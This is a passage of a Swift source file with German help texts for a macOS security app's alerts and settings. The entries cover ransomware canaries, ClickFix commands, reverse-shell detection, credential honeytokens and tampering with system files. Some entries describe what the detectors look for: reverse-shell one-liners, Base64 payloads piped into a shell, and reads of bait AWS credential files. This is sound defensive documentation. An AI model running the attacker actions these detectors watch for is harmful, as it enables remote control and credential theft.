                title: "🧪 EICAR-Testsignatur erkannt (harmlos) — nur im Benachrichtigungsverlauf vermerkt",
                summary: "Erklärt, wie die harmlose EICAR-Testdatei behandelt wird, die zur Prüfung von Antivirensoftware dient. Sie ist keine echte Bedrohung, daher erscheint kein Banner, und nichts wird isoliert oder blockiert; sie wird nur im Benachrichtigungsverlauf vermerkt.",
                details: """
                • Gilt für: Web- & E-Mail-Schutz, ClamAV-Schnell-/Ordnerscans sowie den geplanten Scan der Patrouille gleichermaßen.
                • Verhalten: Die Datei bleibt, wo sie ist. „EICAR-Testsignatur erkannt (harmlos)“ wird in „🔔 Benachrichtigungsverlauf…“ vermerkt.
                • Grund: Warnbanner für Nicht-Bedrohungen würden wirklich wichtige Alarme untergehen lassen.
                """,
                recommendation: """
                1. Keine Aktion nötig. Haben Sie die Datei zu Testzwecken abgelegt, löschen Sie sie nach Bestätigung des Ergebnisses.
                2. Ob der Scan funktioniert, können Sie über den Eintrag im Benachrichtigungsverlauf bestätigen.
                """
            ),
            LocalizedEntry(
                id: "alert_pickle_model",
                title: "⚠️ Download eines KI-Modells im Pickle-Format erkannt",
                summary: "Wird angezeigt, wenn eine `.pkl`- / `.pickle`- / `.pt`-KI-Modelldatei heruntergeladen wird. Das Pickle-Format kann allein durch das Laden beliebigen Code ausführen.",
                details: """
                • Ursache: Eine Modelldatei wurde von Hugging Face, Civitai o. Ä. gespeichert.
                • Automatische Abwehr: Nur eine Warnung (die Datei wird nicht isoliert).
                """,
                recommendation: """
                1. Laden Sie Modelle nur, wenn sie aus einer vertrauenswürdigen offiziellen Quelle stammen.
                2. Nutzen Sie nach Möglichkeit dasselbe Modell im `.safetensors`- oder `.gguf`-Format.
                """
            ),
            LocalizedEntry(
                id: "alert_ransomware_activity",
                title: "🚨 KRITISCHE AUTOMATISCHE ABWEHR: Ransomware-Aktivität blockiert",
                summary: "Die dringende Benachrichtigung und das Notfallfenster, die erscheinen, wenn eine Köderdatei (Canary) geändert, gelöscht oder umbenannt wurde und Air-Gap-Eindämmung, Freigabe-Stopp und Pausierung des verdächtigen Prozesses ausgelöst wurden.",
                details: """
                • Ursache: Ein Prozess wie Ransomware versuchte, Dateien in Ihren Benutzerordnern zu verschlüsseln oder zu zerstören (oder ein Simulationslauf).
                • Automatische Abwehr: Sämtlicher Datenverkehr gekappt plus WLAN-Funk aus, SMB / SSH / Bildschirmfreigabe gestoppt, verdächtiger Prozess pausiert (SIGSTOP). Das Notfallfenster zeigt, ob die Trennung erfolgreich war, den verdächtigen Prozess sowie möglicherweise betroffene Dateien.
                """,
                recommendation: """
                1. Speichern Sie offene Arbeiten und beenden Sie alle verdächtigen Apps.
                2. Suchen Sie im Aktivitätsmonitor nach Prozessen mit stark steigender CPU- oder Festplattennutzung und beenden Sie unbekannte zwangsweise.
                3. Prüfen Sie möglicherweise betroffene Dateien und Ihre Backups (Time Machine usw.).
                4. Heben Sie die Eindämmung, sobald es sicher ist, über das Notfallfenster auf (Netzwerk wird wiederhergestellt, der pausierte Prozess fortgesetzt, Köderdateien neu erzeugt).
                """
            ),
            LocalizedEntry(
                id: "alert_runtime_threat_airgap",
                title: "🚨 XProtect hat Malware erkannt — Netzwerk automatisch getrennt",
                summary: "Das Notfallfenster und die Benachrichtigung, die erscheinen, wenn Apples XProtect / XProtect Remediator eine Datei als Malware eingestuft hat und die XProtect-gebundene automatische Trennung eine Air-Gap-Eindämmung ausgelöst hat.",
                details: """
                • Ursache: Apples Malware-Engine hat eine von Ihnen heruntergeladene oder ausgeführte Datei als bösartig eingestuft.
                • Automatische Abwehr: Sämtlicher Datenverkehr gekappt, WLAN-Funk aus und bereits bestehende Verbindungen getrennt. Ein XProtect-Fund hat hohe Sicherheit und wird daher nicht nach 10 Minuten wiederhergestellt: Nach bis zu 1 Stunde vollständiger Trennung folgt ein eingeschränkter Modus (keine neuen ausgehenden Verbindungen), bis Sie ihn aufheben oder eine erneute Prüfung die beseitigte Ursache bestätigt. Der erkennende Prozess, die Kategorie und Apples Erkennungsmeldung werden festgehalten.
                """,
                recommendation: """
                1. Ermitteln Sie die gerade heruntergeladenen oder ausgeführten Dateien oder Apps und löschen Sie sie.
                2. Führen Sie einen ClamAV-Scan und die Sicherheitsprüfung durch und prüfen Sie Autostart-Registrierungen (LaunchAgents) auf Verdächtiges.
                3. Heben Sie die Eindämmung, sobald es sicher ist, über das Notfallfenster auf.
                4. Der Status ist auch über das MCP-Tool `get_runtime_threat_status` abrufbar.
                """
            ),
            LocalizedEntry(
                id: "alert_gatekeeper_block",
                title: "🛡️ Gatekeeper hat eine unsignierte App am Ausführen gehindert",
                summary: "Eine Benachrichtigung, dass macOS Gatekeeper eine App ohne Signatur oder Notarisierung am Start gehindert hat. Keine automatische Trennung.",
                details: """
                • Ursache: Sie haben versucht, eine unsignierte App aus dem Internet oder Ihren eigenen Entwickler-Build zu öffnen.
                • Automatische Abwehr: Keine (nur Benachrichtigung). Die XProtect-gebundene Trennung greift nur, wenn XProtect tatsächlich Malware erkennt.
                """,
                recommendation: """
                1. Kennen Sie die App (z. B. eigener Build), ist keine Aktion nötig.
                2. Wenn nicht, prüfen Sie den Signaturaussteller mit „Datei-/App-Sicherheit prüfen…“ und löschen Sie sie bei Verdacht.
                """
            ),
            LocalizedEntry(
                id: "alert_clickfix_command",
                title: "🚨 Verdächtige Befehlsausführung erkannt / ⚠️ Verdächtigen Befehl in Zwischenablage erkannt",
                summary: "Wird angezeigt, wenn ein Befehl, der der ClickFix-Technik entspricht, im Terminal ausgeführt wurde (aus dem Shell-Verlauf erkannt) oder in die Zwischenablage kopiert wurde.",
                details: """
                • Ursache: Sie wurden zu einem gefälschten Captcha oder einer gefälschten Fehlerseite geführt, die sagte „Führen Sie diesen Befehl aus, um das Problem zu beheben“. Erkannt werden Reverse-Shell-Einzeiler und Base64-dekodierter Inhalt, der in eine Shell oder osascript geleitet wird.
                • Automatische Abwehr (bei Ausführung im Terminal, Pro, standardmäßig deaktiviert): Air-Gap-Eindämmung (WLAN-Funk wird nicht ausgeschaltet), automatisch nach maximal 10 Minuten wiederhergestellt. Stimmt die URL im Befehl mit einem bekannten offiziellen Installer überein (rustup, Docker, Homebrew, uv/astral, deno, bun oder nvm), wird stattdessen nur eine informative Benachrichtigung gesendet.
                • Automatische Abwehr (beim Kopieren, standardmäßig aktiviert): Die Zwischenablage wird sofort geleert.
                """,
                recommendation: """
                1. Haben Sie den Befehl nur kopiert, schließen Sie die Webseite und fügen oder führen Sie nichts aus.
                2. Haben Sie ihn ausgeführt, prüfen Sie, ob Schlüsselbund, im Browser gespeicherte Passwörter und Krypto-Wallets sicher sind, und ändern Sie wichtige Passwörter von einem anderen vertrauenswürdigen Gerät aus.
                3. Prüfen Sie Autostart-Registrierungen (LaunchAgents / Daemons) auf Verdächtiges und führen Sie einen ClamAV-Scan durch.
                """
            ),
            LocalizedEntry(
                id: "alert_new_persistence_item",
                title: "🚨 Neue Autostart-Registrierung erkannt",
                summary: "Wird angezeigt, wenn ein neuer LaunchAgent / LaunchDaemon registriert und als verdächtig eingestuft wurde (startet direkt einen Skript-Interpreter, hat eine ungültige Signatur usw.).",
                details: """
                • Ursache: Malware wie ein Infostealer, der sich registriert, um Neustarts zu überstehen, oder ein App-Installer, der einen Eintrag hinzufügt.
                • Automatische Abwehr: Nur eine Benachrichtigung (die Registrierung selbst kann nicht verhindert werden). Die Benachrichtigung zeigt den plist-Pfad und den Grund.
                """,
                recommendation: """
                1. Prüfen Sie, ob Sie gerade selbst eine App installiert haben. Falls ja, ist keine Aktion nötig.
                2. Wenn nicht, löschen Sie die in der Benachrichtigung gezeigte plist sowie das Skript oder die App, die sie startet.
                3. Starten Sie den Mac danach neu und führen Sie einen ClamAV-Scan durch.
                """
            ),
            LocalizedEntry(
                id: "alert_new_startup_script",
                title: "🚨 Verdächtiger Eintrag an einer automatisch ausgeführten Stelle erkannt",
                summary: "Wird angezeigt, wenn in einer Shell-Startdatei (z. B. `.zshrc`), `~/.ssh/rc`, einem periodischen Skript, einem Git-Hook oder einem Folder-Action-Skript eine verdächtige Zeile auftaucht oder ein verdächtiger Login-/Logout-Hook gesetzt wird.",
                details: """
                • Ursache: Malware wie ein Infostealer, die sich einträgt, um bei jeder Anmeldung oder jedem Start zu laufen, oder Sie bzw. ein von Ihnen genutztes Werkzeug haben die Datei bearbeitet.
                • Automatische Abwehr: Nur eine Benachrichtigung (das Schreiben selbst kann nicht verhindert werden). Die Benachrichtigung zeigt den Dateipfad, die verdächtige Zeile und den Grund.
                """,
                recommendation: """
                1. Prüfen Sie, ob Sie die Datei gerade selbst bearbeitet oder ein Werkzeug installiert haben. Falls ja, ist keine Aktion nötig.
                2. Wenn nicht, löschen Sie die in der Benachrichtigung gezeigte Zeile. Bei einem Login-/Logout-Hook entfernen Sie die Hook-Einstellung selbst.
                3. Löschen Sie auch das Programm, das diese Zeile aufruft, starten Sie den Mac neu und führen Sie einen ClamAV-Scan durch.
                """
            ),
            LocalizedEntry(
                id: "alert_reverse_shell",
                title: "🐚 Verdacht auf Reverse Shell erkannt",
                summary: "Ein- und Ausgabe einer Shell oder eines Interpreters sind mit einer Verbindung zu einem externen Server verbunden. Ein Angreifer steuert diesen Mac möglicherweise aus der Ferne.",
                details: """
                • Inhalt der Meldung: Programmpfad und PID, Adresse der Gegenstelle, übergeordneter Prozess und Befehlszeile.
                • Häufige Ursachen: das Installationsskript eines bösartigen Pakets, ein nach einer gefälschten Fehlerseite eingefügter ClickFix-Befehl oder ein Befehl, den ein fehlgeleiteter KI-Agent ausgeführt hat. Auch ein legitimes Fernsteuerungswerkzeug, das eine Shell an einen externen Server übergibt, kann es auslösen.
                • Automatische Reaktion: nur Hinweis. Weder der Prozess noch das Netzwerk wird gestoppt.
                """,
                recommendation: """
                1. Prüfen Sie Pfad, übergeordneten Prozess und Befehl in der Meldung und klären Sie, ob es Ihre eigene Aktion war.
                2. Wenn Sie es nicht erklären können, schalten Sie das WLAN aus oder ziehen Sie das Kabel und beenden Sie den Prozess.
                3. Finden Sie heraus, woher er gestartet wurde (übergeordneter Prozess, zuvor ausgeführter Befehl, Protokoll des Prozessausführungs-Rekorders = feat_exec_recorder), und ändern Sie möglicherweise abgeflossene Zugangsdaten.
                4. Wenn Sie die Nutzung kennen, erlauben Sie sie über „Letzte Reverse-Shell-Erkennung zur Erlaubnisliste hinzufügen…“.
                """
            ),
            LocalizedEntry(
                id: "alert_network_settings_changed",
                title: "🌐 Netzwerkeinstellungen weichen von früher ab",
                summary: "DNS-Server, Router oder automatische Proxy-Konfiguration (PAC), die das verbundene Netzwerk verteilt, weichen vom früheren Stand desselben Netzwerks ab. Ein gefälschter DHCP-Server oder ein WPAD-Man-in-the-Middle-Angriff ist möglich.",
                details: """
                • Inhalt der Meldung: der Netzwerkname und der bisher unbekannte DNS-Server, Router oder PAC-Host, oder dass WPAD eingeschaltet wurde.
                • Ein DNS-Server wurde zu den gespeicherten Einstellungen eines Dienstes hinzugefügt (mit dem Namen des Dienstes angezeigt): Er wurde mit `networksetup -setdnsservers` oder im Bereich „Netzwerk“ von Ihnen, einem Administrator oder einem Programm geschrieben, und welches davon, lässt sich nicht feststellen. Wenn Sie es nicht waren, setzen Sie die DNS-Server in den Systemeinstellungen unter „Netzwerk“ zurück.
                • Harmlose Ursachen: ein getauschter Router, ein Providerwechsel oder eine Einstellungsänderung; ein Administrator, der in einem Firmen- oder Schulnetz Einstellungen geändert hat.
                • Automatische Reaktion: nur Hinweis. Keine Einstellung wird geändert, kein Verkehr blockiert. Dieselbe Meldung kommt nur einmal.
                """,
                recommendation: """
                1. Wenn Sie Router oder Provider gewechselt haben, akzeptieren Sie es über „Basis der Netzwerkeinstellungen auf den aktuellen Stand setzen…“.
                2. Wenn nicht, nutzen Sie dieses Netzwerk nicht weiter und wechseln Sie zu einer vertrauenswürdigen Verbindung wie Mobilfunk.
                3. War WPAD eingeschaltet, schalten Sie „Automatische Proxy-Erkennung“ unter Systemeinstellungen > Netzwerk > Ihre Verbindung > Details > Proxys aus.
                """
            ),
            LocalizedEntry(
                id: "alert_docker_risk",
                title: "⚠️ Riskante Docker-Container-Konfiguration erkannt",
                summary: "Benachrichtigt Sie, dass gerade ein Container gestartet wurde, der mit `--privileged` läuft oder `docker.sock` eingebunden hat.",
                details: """
                • Ursache: Privilegierte Container und Docker-Socket-Mounts erlauben einem Container, den Host zu steuern, und schaffen so ein Risiko für einen Container-Ausbruch.
                • Automatische Abwehr: Keine (nur Benachrichtigung).
                """,
                recommendation: """
                1. Ist es beabsichtigt (z. B. ein Überwachungs-Agent), ist keine Aktion nötig.
                2. Andernfalls prüfen Sie den Container mit `docker ps` und `docker inspect` und stoppen Sie ihn.
                """
            ),
            LocalizedEntry(
                id: "alert_critical_file_tampering",
                title: "🚨 Manipulation an wichtiger Systemdatei erkannt",
                summary: "Wird angezeigt, wenn bei kritischen Dateien wie sudoers, SSH-Konfiguration, PAM, hosts oder den authorized_keys von root eine Änderung, Löschung oder neue Datei erkannt wird.",
                details: """
                • Ursache: Eine Konfigurationsänderung durch einen Administrator (`sudo visudo`, Bearbeiten der SSH-Einstellungen), eine Änderung durch Software, oder ein Angreifer, der Rechte ausweitet oder eine Backdoor einrichtet.
                • Automatische Abwehr: Nur eine Benachrichtigung. Der neue Zustand wird nie automatisch als legitim akzeptiert.
                • Verwandt: „Manipulationserkennung an wichtigen Dateien funktioniert nicht“ bedeutet, dass Scans wiederholt fehlgeschlagen sind, weil der privilegierte Helfer nicht erreichbar war.
                • SSH-Hinweis: Die Benachrichtigung fügt die SSH-Sitzungen desselben Zeitraums hinzu (ab 30 Minuten vor der Änderung): Quelle, Konto, Authentifizierungsmethode und ob die Sitzung noch offen ist. Das ist nur ein Hinweis aufgrund zeitlicher Überschneidung und zeigt nicht, ob diese Sitzung die Datei geändert hat (dieser Mac zeichnet nicht auf, welcher Prozess geschrieben hat). Wurde keine SSH-Anmeldung gefunden, steht das ebenfalls dort.
                """,
                recommendation: """
                1. Prüfen Sie, ob Sie oder ein Administrator die in der Benachrichtigung gezeigten Dateien geändert haben.
                2. Wenn nicht, suchen Sie nach `NOPASSWD`-Einträgen in `/etc/sudoers`, unbekannten Schlüsseln in `authorized_keys` u. Ä. und entfernen Sie diese.
                3. Ändern Sie das Administratorpasswort und führen Sie die Sicherheitsprüfung durch.
                """
            ),
            LocalizedEntry(
                id: "alert_log_audit_anomaly",
                title: "🔔 Protokoll-Audit: anomale Muster erkannt",
                summary: "Wird von der automatischen Protokollprüfung gesendet, wenn sie auf diesem Mac noch nie gesehene Protokollmuster ([neu]) oder deutlich häufigere Protokolle als üblich ([Spitze z=…]) findet.",
                details: """
                • Ursache: Meist erwartete Änderungen durch den Anschluss eines neuen Geräts oder App-/macOS-Updates, gelegentlich aber auch verdächtige Anmeldeversuche oder unbekannte Prozessaktivität.
                • Inhalt: Aufschlüsselung der Anzahl, bis zu 3 echte Protokollzeilen, Lernfortschritt (z. B. Häufigkeits-Baseline lernt noch: bisher 2/3 Beobachtungen) sowie eine verständliche Erklärung.
                • Automatische Abwehr: Keine (nur Benachrichtigung).
                """,
                recommendation: """
                1. Sind es nur neue Muster ohne unbekannte App-Namen oder IP-Adressen, ist keine Aktion nötig.
                2. Fällt eine Häufigkeitsspitze mit etwas zusammen, das Sie nicht getan haben, öffnen Sie „📜 Mac-Sicherheitsprotokoll-Audit…“ für Details.
                3. Sind Sie unsicher, nutzen Sie „Material für KI-Beratung kopieren“, um einen KI-Assistenten zu fragen.
                """
            ),
            LocalizedEntry(
                id: "alert_secret_in_clipboard",
                title: "🔑 Vertraulicher Schlüssel in Zwischenablage erkannt",
                summary: "Teilt Ihnen mit, dass ein API-Schlüssel oder privater Schlüssel (OpenAI, Anthropic, GitHub, AWS usw.) in der Zwischenablage liegt.",
                details: """
                • Ursache: Sie haben einen API-Schlüssel, ein Token oder einen privaten Schlüssel kopiert.
                • Automatische Abwehr: Nur eine Benachrichtigung (die Zwischenablage wird nicht geleert).
                """,
                recommendation: """
                1. Achten Sie darauf, ihn nicht versehentlich in eine Website oder einen KI-Chat einzufügen.
                2. Kopieren Sie danach anderen Text, um ihn zu überschreiben.
                3. Haben Sie ihn versehentlich geteilt, widerrufen und erneuern Sie den Schlüssel sofort in der Konsole des Dienstes.
                """
            ),
            LocalizedEntry(
                id: "alert_honeytoken_access",
                title: "🍯 Zugriff auf Anmeldedaten-Honeytoken erkannt",
                summary: "Meldet, dass eine von RoamSwitch ausgelegte Köder-Anmeldedatei (z. B. ~/.aws/credentials) gelesen wurde.",
                details: """
                • Was die Meldung zeigt: den Pfad der Köderdatei, das zugreifende Programm (Pfad und PID), seinen übergeordneten Prozess und den Befehl (Geheimnisse maskiert).
                • Wenn der Zugreifende nicht ermittelt werden kann: Die Meldung sagt das und zeigt, was geprüft wurde (Prozesse mit geöffneter Datei, Aufzeichnung der Prozessstarts). Der lesende Prozess ist oft schon beendet; ist die Prozessaufzeichnung aktiv, werden die zur selben Zeit gestarteten Befehle aufgeführt (sie haben die Datei nicht zwingend gelesen). Ist die Aufzeichnung der Prozesse, die Dateien öffnen, aktiv (Fenster „Prozessstart-Protokoll“), wird der lesende Prozess selbst mit PID, übergeordnetem Prozess, Befehl und Signatur genannt, und die Vermutungen entfallen; ist sie aus, wegen Last pausiert oder noch nicht gestartet, sagt die Meldung das.
                • Automatische Abwehr: nur Meldung und Protokoll (ein weiterer Köder wird ausgelegt; das Netzwerk wird nicht getrennt).
                """,
                recommendation: """
                1. Prüfen Sie anhand von Pfad und Befehl, ob Sie das selbst ausgeführt haben.
                2. Wenn Sie es nicht kennen, prüfen Sie Speicherort und Signatur des Programms, beenden Sie es und widerrufen bzw. erneuern Sie die betroffenen Zugangsdaten (AWS-Schlüssel, SSH-Schlüssel, Docker-Anmeldung usw.).
                3. Ist der Zugreifende unbekannt, schalten Sie die Prozessaufzeichnung ein; künftig nennt die Meldung die zur selben Zeit gestarteten Befehle (feat_exec_recorder). Damit der lesende Prozess selbst genannt wird, schalten Sie im selben Fenster auch die Aufzeichnung der Prozesse ein, die Dateien öffnen.
                """
            ),
            LocalizedEntry(
                id: "alert_airgap_failed",
                title: "🚨 Automatische Netzwerktrennung fehlgeschlagen",
                summary: "Eine dringende Warnung, die erscheint, wenn eine Notfalltrennung (Ransomware, ARP-Spoofing, XProtect-Erkennung, ClickFix usw.) versucht wurde, die vollständige pf-Sperre aber nicht angewendet werden konnte.",
                details: """
                • Ursache: Der privilegierte Helfer hat nicht reagiert (nicht genehmigt, gestoppt oder Timeout). Erscheint nach 3 fehlgeschlagenen Versuchen.
                • Aktueller Zustand: Eingehender Verkehr ist möglicherweise durch die Anwendungs-Firewall blockiert, ausgehender Verkehr wurde jedoch nicht gestoppt.
                """,
                recommendation: """
                1. Schalten Sie WLAN sofort aus oder trennen Sie das Netzwerkkabel.
                2. Behandeln Sie die Bedrohung (Prozesse beenden, Scans durchführen).
                3. Prüfen Sie danach den Status des Helfers (faq_helper_troubleshooting).
                """
            ),
        ]
    }

    // MARK: - Settings

    private static func settingsDe() -> [LocalizedEntry] {
        return [
            LocalizedEntry(
                id: "set_trusted_networks",
                title: "Registrierte Netzwerke & Schutzstufen je Netzwerk",
                summary: "Registrieren Sie das aktuelle Netzwerk als Zuhause, Arbeit, Tethering usw. und legen Sie für jedes Netzwerk eine Schutzstufe fest (Vertrauenswürdig / Ausgewogen / Maximale Sperre).",
                details: """
                • Registrieren: Aktuelles Netzwerk registrieren → Als „Zuhause“ registrieren (Vertrauenswürdig) / Als „Arbeit“ registrieren (Ausgewogen) / Als „Tethering“ registrieren (Ausgewogen) / Mit benutzerdefiniertem Namen registrieren…. Netzwerke werden anhand der Gateway-MAC-Adresse identifiziert.
                • Stufe ändern: Wählen Sie das Netzwerk unter „Aktuelles Netzwerk: …“ oder „Registrierte Netzwerke (n)“ und wählen Sie 🟢 / 🟡 / 🔴.
                • Umbenennen oder entfernen: Umbenennen…, Registrierung aufheben, oder Löschen.
                """,
                recommendation: "Zuhause als 🟢 Vertrauenswürdig und Arbeit oder Tethering als 🟡 Ausgewogen funktionieren gut. Gemeinsam genutztes Büro-WLAN lässt man sicherer unregistriert unter Maximaler Sperre."
            ),
            LocalizedEntry(
                id: "set_away_default_level",
                title: "Standard-Schutz unterwegs (Stufe für nicht registrierte Netzwerke)",
                summary: "Legt die Schutzstufe fest, die automatisch angewendet wird, wenn Sie einem nicht registrierten Netzwerk beitreten. Anfänglich 🔴 Maximale Sperre.",
                details: """
                • Einstellung: „Standard-Schutz unterwegs: …“ im Menü, dann 🟢 Vertrauenswürdig / 🟡 Ausgewogen / 🔴 Maximale Sperre.
                • Wirkt sich auch auf Funktionen aus, die an ein nicht vertrauenswürdiges Netzwerk geknüpft sind, etwa DNS-Bedrohungsschutz (nur unterwegs), automatisches VPN-Verbinden, Gateway-ARP/NDP-Fixierung und automatisches Bluetooth-Aus.
                """,
                recommendation: "Nutzen Sie unterwegs keine Freigabedienste oder AirDrop, wird dringend empfohlen, es bei Maximaler Sperre zu belassen."
            ),
            LocalizedEntry(
                id: "set_manual_override",
                title: "Manuelle Überschreibung & Schutz vor vergessenem Zurücksetzen",
                summary: "Legt vorübergehend von Hand eine Schutzstufe für eine gewählte Dauer fest. Sie kehrt nach Ablauf der Zeit oder bei einem Netzwerkwechsel zur automatischen Erkennung zurück, sodass Sie das Zurücksetzen des Schutzes nicht vergessen.",
                details: """
                • Einstellung: Manuelle Überschreibung → eine Stufe (🟢 / 🟡 / 🔴) → eine Dauer.
                • Dauer: Bis zur Trennung (Empfohlen), Für 1 Stunde, Für 4 Stunden, Bis zum manuellen Aufheben.
                • Zurücksetzen: Manuelle Überschreibung → Zurück zur automatischen Erkennung, oder „🔄 Manuelle Überschreibung aufheben (Auto)“ oben im Menü.
                • Das Aufheben einer Air-Gap-Eindämmung setzt ebenfalls jede manuelle Überschreibung zurück.
                """,
                recommendation: "Lockern Sie den Schutz vorübergehend für eine Präsentation oder Entwicklungsarbeit, nutzen Sie Bis zur Trennung oder Für 1 Stunde, damit Sie unterwegs nie ungeschützt bleiben."
            ),
            LocalizedEntry(
                id: "set_pro_default_guards",
                title: "Mit Pro automatisch aktivierte Schutzfunktionen und optionale Schutzfunktionen",
                summary: "Beim ersten Aktivieren einer Pro-Lizenz werden die autonomen Verteidigungsfunktionen automatisch eingeschaltet, die überwiegend nur benachrichtigen, selten Fehlalarme auslösen und weder zusätzliche Berechtigungen noch eine Einrichtung brauchen. Alles, was die normale Nutzung stören könnte oder zusätzliche Berechtigungen, Einrichtung oder externe Kommunikation erfordert, bleibt Opt-in. Danach wird die von Ihnen für jede Funktion getroffene Ein-/Aus-Wahl respektiert.",
                details: """
                • Automatisch eingeschaltet (einmalig, bei erster Pro-Aktivierung): Automatische Blockierung unbekannter Listening-Ports, Erkennung eingehender Portscans (einschließlich der 10-minütigen automatischen Blockierung der Scan-Quelle), SSH-Brute-Force-Erkennung (arbeitet nur bei aktiver Fernanmeldung), Ransomware-Köderdatei-Erkennung und Entropie-Erkennung, Anmeldedaten-Honeytokens, automatische Blockierung bei ARP-Spoofing, automatische Netzwerktrennung bei XProtect-Malware-Erkennung, automatische Protokollprüfung, Manipulationsüberwachung wichtiger Systemdateien, Manipulationsüberwachung von Abhängigkeits-Lockfiles, Reverse-Shell-Erkennung und Überwachung von Netzwerkeinstellungen. Beim Einschalten der ARP- und XProtect-Trennungen erscheint ein einmaliger erklärender Hinweis.
                • Bei Pro standardmäßig aktiv: Web- & E-Mail-Schutz, Überwachung von Autostart-Registrierungen (LaunchAgent/Daemon), DNS-Bedrohungsschutz (nur in unterwegs genutzten Netzwerken angewendet) und Link-Schutz (automatische Blockierung eindeutig betrügerischer Seiten).
                • Standardmäßig deaktiviert (Opt-in): ClickFix-Auto-Blockierung, Docker-Risikoerkennung, physischer BadUSB-Portschutz, automatische Blockierung von USB-Speicher, Gateway-ARP/NDP-Fixierung, automatisches Bluetooth-Aus, Prozessstart-Protokoll, Überwachung des Browser-Anmeldedatenzugriffs, VPN-Tunnel, Sensor-Kopplung, aktive Schwachstellenverifizierung und npm-Signaturprüfung. Jede davon kann die normale Nutzung unterbrechen (Netzwerktrennung, Eingabegeräte, externe Laufwerke, Ton), braucht eine zusätzliche Berechtigung oder Installation (Vollzugriff auf die Festplatte, Bedienungshilfen, blueutil), erfordert eigene Einstellungen wie eine Positivliste oder kontaktiert einen externen Server. Der Anbieter des DNS-Bedrohungsschutzes ist Ihre Wahl.
                • Auch in der kostenlosen Version standardmäßig aktiv: Zwischenablage-Schutz (API-Schlüssel und ClickFix-Befehle).
                • Später hinzugefügte Schutzfunktionen erhalten für bestehende Pro-Nutzer jeweils einen eigenen einmaligen Standardwert. Eine von Ihnen ausgeschaltete Funktion bleibt aus, auch wenn die Lizenz erneut aktiviert wird. Wird die Lizenz entfernt, werden Nur-Pro-Schutzfunktionen ausgeschaltet; die zuvor eingeschalteten sind bei der nächsten Pro-Aktivierung standardmäßig wieder an.
                • Markierungen im Menü: ✅ heißt, die Einstellung ist an und der Schutz läuft. 🟡 heißt, er läuft nur teilweise (Helfer nicht verbunden, Systemerweiterung wartet auf Freigabe, einige Dateien nicht lesbar). ⚠️ heißt, die Einstellung ist an, der Schutz läuft aber nicht (Pro nicht aktiv, Helfer nicht verbunden, Eingabe nicht lesbar, nichts zu überwachen, kein Köder platziert). Der Grund steht in Klammern am Ende des Eintrags und im Tooltip. Derselbe Zustand ist liveState und liveStateReason in `get_guard_status`.
                • Wenn die Lizenz beim Start nicht geprüft werden kann: Besteht die gespeicherte Lizenz die Prüfung nicht (Pro abgelaufen, für einen anderen Mac ausgestellt, ungültige Signatur), nennt kurz nach dem Start eine Mitteilung die Schutzfunktionen, die noch eingeschaltet, aber gestoppt sind. Direkt nach der ersten Aktivierung von Pro listet eine Mitteilung außerdem auf, was sich eingeschaltet hat, was Sie selbst einschalten und was noch nicht funktioniert (Freigabe des Helfers, Freigabe der Systemerweiterung, vollständiger Festplattenzugriff, Registrierung überwachter Ordner).
                • Selbstüberwachung (Neustart nach Absturz): standardmäßig aus. Stimmen Sie im Menüpunkt „Selbstüberwachung …“ zu, wird das kleine Überwachungsprogramm in der App als Anmeldeobjekt registriert (ggf. ist eine Freigabe in den Systemeinstellungen nötig). Der Zustand steht im Menü und in `get_detection_coverage` (liveState und liveStateReason von T1685). Ausgeschaltet wird über denselben Eintrag; die Deinstallation entfernt sie ebenfalls. Nach der Freigabe arbeitet die Überwachung ab der nächsten Anmeldung.
                • Sind macOS-Mitteilungen nicht erlaubt oder ist der Stil „Keine“, erscheinen Warnungen nicht auf dem Bildschirm (sie bleiben im Mitteilungsverlauf). Oben im Menü erscheint die Zeile „Mitteilungen sind nicht erlaubt …“, in den Fenstern für Diagnose und Mitteilungsverlauf ein Banner. Die erste Einführung hat außerdem eine Seite zu Mitteilungen und den später nötigen Berechtigungen (vollständiger Festplattenzugriff, Systemerweiterung, Bedienungshilfen, Ortungsdienste).
                """,
                recommendation: "Prüfen Sie nach der Pro-Aktivierung die ✅-Markierungen im Menü. Lassen Sie Schutzfunktionen, die nicht zu Ihrer Nutzung passen (z. B. Docker, falls ungenutzt), deaktiviert, und schalten Sie ein, was Sie brauchen (z. B. das VPN bei häufiger Nutzung öffentlichen WLANs)."
            ),
            LocalizedEntry(
                id: "set_usb_whitelist",
                title: "USB / BadUSB-Schutzeinstellungen (Tastatur-Positivliste & Speicherberechtigungen) (Pro)",
                summary: "Verwalten Sie vertrauenswürdige Tastaturen und dienstliche USB-Speichergeräte in Positivlisten und legen Sie die Speicherberechtigung auf Schreibgeschützt oder Lesen & Schreiben fest.",
                details: """
                • Öffnen: „Port- & Geräteüberwachung“ → „USB / BadUSB-Schutzeinstellungen…“.
                • Tastaturen: Werden hinzugefügt, wenn Sie im Genehmigungsfenster „Vertrauen & Erlauben“ wählen; hier auch entfernbar.
                • Speicher: Wird hinzugefügt, wenn Sie im Verbindungsdialog „Lesen/Schreiben zulassen“ oder „Schreibgeschützt zulassen“ wählen; hier Berechtigung ändern oder entfernen. Ändern Sie ein nicht angeschlossenes Gerät, muss es getrennt und wieder angeschlossen werden, damit die Änderung greift.
                • Der ClamAV-Scan beim Anschluss läuft für erlaubte Geräte weiterhin, bevor sie mit Lesen/Schreiben verbunden werden.
                """,
                recommendation: "Auf Macs mit sensiblen Daten verringert die Registrierung von Speichermedien als Schreibgeschützt das Risiko von Datenlecks erheblich."
            ),
            LocalizedEntry(
                id: "set_watched_folders",
                title: "Überwachte Ordner des Web- & E-Mail-Schutzes (Pro)",
                summary: "Fügen Sie Ordner, die vom Download-Schutz überwacht werden (FSEvents-Überwachung und automatische Scans), hinzu, entfernen Sie sie oder setzen Sie sie zurück.",
                details: """
                • Standardordner: `~/Downloads`, `~/Desktop`, `~/Documents` sowie der Download-Ordner von Mail.
                • Bearbeiten: „Web- & E-Mail-Schutz (Downloads automatisch scannen) (Pro)“ → „📁 Überwachte Ordner“ → „⚙️ Überwachte Ordner verwalten…“.
                • Zurücksetzen: „🔄 Auf Standard zurücksetzen“.
                • Der letzte Scanverlauf (bis zu 5 angezeigt) sowie „Scan-Verlauf löschen“ befinden sich im selben Menü.
                """,
                recommendation: "Haben Sie den Speicherort geändert, an dem Ihr Browser oder Ihre Chat-Apps Dateien ablegen, fügen Sie diesen Ordner unbedingt hinzu."
            ),
            LocalizedEntry(
                id: "set_dns_policy",
                title: "Anbieter und Richtlinie des DNS-Bedrohungsschutzes (Pro)",
                summary: "Wählen Sie den sicheren DNS-Anbieter, der bösartige Domains blockiert, und legen Sie fest, wann er gilt (nur unterwegs / immer).",
                details: """
